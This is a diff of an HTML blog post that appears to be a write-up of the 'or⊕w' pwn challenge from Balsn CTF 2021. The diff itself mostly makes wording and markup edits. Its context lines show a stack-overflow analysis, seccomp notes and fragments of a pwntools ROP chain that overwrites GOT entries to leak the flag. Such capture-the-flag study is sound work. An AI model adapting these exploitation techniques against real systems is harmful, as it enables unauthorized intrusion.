@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
     <title>or⊕w writeup from Balsn CTF 2021 - x3ero0&#39;s blog</title>
-
+    <link rel="shortcut icon" href="/img/favicon.ico">
     <style type="text/css">
         img.wp-smiley,
         img.emoji {
@@ -113,7 +113,7 @@
   />
 </div>
 <p><strong>or⊕w</strong> was the easiest pwn challenge from Balsn CTF 2021. There were 3 more Pwn tasks, which were really hard.
-in total there were 4 pwn challenges and I only managed to solve or⊕w. Here is the list of Pwn challenges.</p>
+In total there were 4 pwn challenges and I only managed to solve or⊕w. Here is the list of Pwn challenges.</p>
 <ul>
 <li>
 <ol>
@@ -161,7 +161,7 @@ in total there were 4 pwn challenges and I only managed to solve or⊕w. Here is
   />
 </div>
 <p>In this beautiful decompilation given by IDA, you could easily spot the vulnerability. Its a very obvious <strong>Stack Buffer Overflow</strong> Vulnerability. The stack only reserved space for 16 bytes but the <strong>read()</strong> function is reading 0x400 (1024) Bytes in input. But if you look closely, you will see that its not your normal buffer overflow challenge.</p>
-<p>After the call to <strong>read()</strong> we see that the program calls <strong>fork()</strong> and handles both parent and child differently. If you don&rsquo;t know what <strong>fork()</strong> does, basically it creates a clone of the process with exact same execution state and only one difference and that is the return value of the syscall. <strong>fork()</strong> is actually just a wrapper around the <strong>fork</strong> syscall. The newly created process is called the child of the original process and the original process is called the parent process.</p>
+<p>After the call to <strong>read()</strong> we see that the program calls <strong>fork()</strong> and handles both parent and child differently. If you don&rsquo;t know what <strong>fork()</strong> does, basically it creates a clone of the process with exact same execution state and only one difference and that is the return value of the syscall. <strong>fork()</strong> is actually just a wrapper around the <strong>fork</strong> syscall (actually it&rsquo;s a wrapper around clone syscall, clone has more arguments). The newly created process is called the child of the original process and the original process is called the parent process.</p>
 
 
 
@@ -185,7 +185,7 @@ in total there were 4 pwn challenges and I only managed to solve or⊕w. Here is
     decoding="async"
   />
 </div>
-<p>When <strong>fork()</strong> return a non-zero value, that means we are in the parent and this non-zero value is the PID (Process ID) of the child which was just spawned. You can see in the above code that if we are in the parent then we call the <strong>wait()</strong> which is just a wrapper around the <strong>WAIT</strong> system call. <strong>WAIT</strong> system call will wait (blocking wait) for any change in the child state of the calling process.</p>
+<p>When <strong>fork()</strong> return a non-zero value, that means we are in the parent and this non-zero value is the PID (Process ID) of the child which was just spawned. You can see in the above code that if we are in the parent then we call the <strong>wait()</strong> which is just a wrapper around the <strong>wait4</strong> system call. <strong>wait4</strong> system call will wait (blocking) for any change in the child state of the calling process.</p>
 
 
 
@@ -197,7 +197,7 @@ in total there were 4 pwn challenges and I only managed to solve or⊕w. Here is
     decoding="async"
   />
 </div>
-<p>In the code above you can see it calls different seccomp functions to create different syscall filters in both parent and child. <strong>Seccomp</strong> filtering provides a means for a process to specify a filter for incoming system calls. These filters are sort of security mitigations to limit the damage if the process is compromised. The filters allow you to blacklist a bunch of syscalls and only allow few selected syscalls which the programmers thinks are safe.</p>
+<p>In the code above you can see it calls different <strong>seccomp</strong> functions to create different syscall filters in both parent and child. <strong>Seccomp</strong> filtering provides a means for a process to specify a filter for incoming system calls. These filters are sort of security mitigations to limit the damage if the process is compromised. The filters allow you to blacklist a bunch of syscalls and only allow few selected syscalls which the programmers thinks are safe.</p>
 <p>It closes <strong>stdin, stdout, stderr</strong> in the parent so we cannot do funky stuff in the child process.
 One thing I could not notice initially was the fact that the status word
 was stored on the <strong>.BSS</strong> section, which was very crucial for my exploit.</p>
@@ -318,7 +318,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
     decoding="async"
   />
 </div>
-<p>As you can see in the above image after the <strong>clone</strong> syscall, which is what <strong>fork()</strong> uses for some reason that i don&rsquo;t know, we see that child is spawned with PID <strong>23852</strong> and it gets a <strong>SIGSEGV</strong> signal and crashes with a segfault. Same thing happens with the parent but the difference is that it does not happen parallely as one would expect and it only happens once the child has exited/crashed.</p>
+<p>As you can see in the above image after the <strong>clone</strong> syscall, which is what <strong>fork()</strong> uses for some reason that I don&rsquo;t know, we see that child is spawned with PID <strong>23852</strong> and it gets a <strong>SIGSEGV</strong> signal and crashes with a segfault. Same thing happens with the parent but the difference is that it does not happen parallely as one would expect and it only happens once the child has exited/crashed.</p>
 
 
 
@@ -422,7 +422,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 
 
 <p>The rop chain looks like this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#6272a4"># gadgets</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#6272a4"># gadgets</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401573</span>  <span style="color:#6272a4"># pop rdi ; ret</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401571</span>  <span style="color:#6272a4"># pop rsi ; pop r15 ; ret</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>POP_RSP <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40156d</span>  <span style="color:#6272a4"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
@@ -464,7 +464,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(ADD_VAL)
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>
 </code></pre></div><p>With the setup complete, lets create the parent rop chain.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)           <span style="color:#6272a4"># rdi = status_word - 0x20</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)           <span style="color:#6272a4"># rdi = status_word - 0x20</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(STATUSG <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>)
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])   <span style="color:#6272a4"># rbx = 0</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
@@ -496,7 +496,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
   />
 </div>
 <p>After this we resolve the <strong>close</strong> <strong>GOT</strong> address to <strong>open</strong> and fix the <strong>read</strong> <strong>GOT</strong> address. We also put the flag string in memory to be used by child ropchain to open the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#6272a4"># set close -&gt; open64</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
@@ -525,7 +525,7 @@ was stored on the <strong>.BSS</strong> section, which was very crucial for my e
 </code></pre></div><p>Once you figure out how to execute different ROP chains with the same payload under parent and child, the rest of the exploitation is faily easy.</p>
 <p>I created a small function to give me ROP chain to leak a specific byte from the flag and then I just ran that exploit until I leaked the &ldquo;}&rdquo; character which means we got the whole flag.</p>
 <p>To get a nice output from the exploit I used pwntool&rsquo;s logging functionality.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; &#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; &#34;</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">with</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>local(log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;warn&#39;</span>), \
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>progress(<span style="color:#f1fa8c">&#39;Flag&#39;</span>, level<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>logging<span style="color:#ff79c6">.</span>WARN) <span style="color:#ff79c6">as</span> flag_leak:
